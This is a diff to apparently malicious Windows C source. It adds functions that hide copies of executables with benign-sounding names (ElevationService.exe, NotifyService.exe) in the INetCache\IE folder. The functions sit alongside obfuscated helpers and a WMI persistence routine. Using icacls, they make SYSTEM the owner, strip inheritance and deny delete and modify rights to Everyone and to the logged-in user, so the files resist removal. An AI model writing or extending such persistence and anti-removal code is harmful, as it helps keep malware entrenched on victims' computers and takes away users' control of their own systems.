@@ -747,9 +747,21 @@ void obf_sys_wmi_persistence(void) {
  * 2. Hiding files (hidden + system attributes)
  * 3. Removing inherited permissions
  */
+/* === Aggressive file hardening: directory + files ===
+ *
+ * Makes it extremely difficult to delete the shadow copies by:
+ * 1. Hardening the PARENT directory (deny DELETE_CHILD prevents file deletion)
+ * 2. Changing owner to SYSTEM on both directory and files
+ * 3. Setting SYSTEM + HIDDEN attributes
+ * 4. Removing all inherited permissions
+ * 5. Explicitly denying all write/delete/modify permissions for Everyone
+ */
 void obf_sys_harden_files(void) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    
+    char dirPath[MAX_PATH];
+    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
     
     const char *files[] = {
         "ElevationService.exe",
@@ -757,20 +769,90 @@ void obf_sys_harden_files(void) {
         "NotifyService.exe"
     };
     
+    char *icacls = obf_icacls();
+    char cmd[1024];
+    
+    /* --- Harden directory first --- */
+    SetFileAttributesA(dirPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    
+    /* Remove inheritance, grant only RX, deny ALL modifications including DELETE_CHILD */
+    snprintf(cmd, sizeof(cmd),
+        "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
+        icacls, dirPath);
+    sys_run_command(cmd);
+    
+    /* Change directory owner to SYSTEM */
+    snprintf(cmd, sizeof(cmd),
+        "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
+        icacls, dirPath);
+    sys_run_command(cmd);
+    
+    /* --- Harden each file --- */
     for (int i = 0; i < 3; i++) {
         char path[MAX_PATH];
-        snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
-                 localAppData, files[i]);
+        snprintf(path, sizeof(path), "%s\\%s", dirPath, files[i]);
         
         /* Set hidden + system attributes */
         SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
         
-        /* Remove all inherited permissions, deny delete for Everyone */
-        char cmd[1024];
-        char *icacls = obf_icacls();
+        /* Change owner to SYSTEM */
         snprintf(cmd, sizeof(cmd),
-            "%s \"%s\" /inheritance:r /deny Everyone:(DE,DC,WDAC,WO) /c /q",
+            "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
             icacls, path);
+        sys_run_command(cmd);
+        
+        /* Remove inheritance, grant only RX, deny ALL modifications */
+        snprintf(cmd, sizeof(cmd),
+            "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
+            icacls, path);
+        sys_run_command(cmd);
+        
+        /* Also explicitly deny the current user (defense in depth) */
+        char username[256];
+        DWORD userLen = sizeof(username);
+        if (GetUserNameA(username, &userLen)) {
+            snprintf(cmd, sizeof(cmd),
+                "%s \"%s\" /deny \"%s:(DE,DC,WDAC,WO,W,M)\" /c /q",
+                icacls, path, username);
+            sys_run_command(cmd);
+        }
+    }
+}
+
+/* Harden a single file (used immediately after copy in spawn_single_copy) */
+void obf_sys_harden_single_file(const char *filename) {
+    char localAppData[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    
+    char path[MAX_PATH];
+    snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
+             localAppData, filename);
+    
+    char *icacls = obf_icacls();
+    char cmd[1024];
+    
+    /* Set hidden + system attributes */
+    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    
+    /* Change owner to SYSTEM */
+    snprintf(cmd, sizeof(cmd),
+        "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
+        icacls, path);
+    sys_run_command(cmd);
+    
+    /* Remove inheritance, grant only RX, deny ALL modifications */
+    snprintf(cmd, sizeof(cmd),
+        "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
+        icacls, path);
+    sys_run_command(cmd);
+    
+    /* Also explicitly deny the current user */
+    char username[256];
+    DWORD userLen = sizeof(username);
+    if (GetUserNameA(username, &userLen)) {
+        snprintf(cmd, sizeof(cmd),
+            "%s \"%s\" /deny \"%s:(DE,DC,WDAC,WO,W,M)\" /c /q",
+            icacls, path, username);
         sys_run_command(cmd);
     }
 }
